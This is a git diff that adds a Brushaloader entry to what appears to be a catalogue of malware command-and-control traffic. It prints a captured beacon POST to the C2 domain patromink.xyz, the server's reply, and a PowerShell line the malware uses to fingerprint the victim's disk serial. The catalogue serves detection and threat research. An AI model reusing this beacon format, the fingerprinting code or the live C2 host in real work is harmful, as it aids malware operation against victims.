@@ -210,6 +210,36 @@ BlackRAT.Data.....data.bytes.............16310D190E2C4918020E52	..........$...MZ
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/blackrat.png "Blackrat")
 
+#### Brushaloader
+~~~
+POST / HTTP/1.1
+Accept: */*
+UA-CPU: AMD64
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: patromink.xyz
+Content-Length: 47
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+k=6292&n=6292&m=6292&id=droniks34&m=6292&l=6292
+
+HTTP/1.1 200 OK
+Server: nginx/1.16.1
+Date: Thu, 31 Oct 2019 17:51:52 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+Thank You 22501
+~~~
+~~~
+try {"6f7074696f6e73ProcessorId"; $disks = gwmi Win32_Volume -filter "Name='C:\\'";$disks.SerialNumber}catch{"null"}
+
+6f7074696f6e73ProcessorId 3300537927
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/brushaloader.png "Brushaloader")
+
 #### Cobaltstrike
 ~~~
 GET /Mdt7 HTTP/1.1
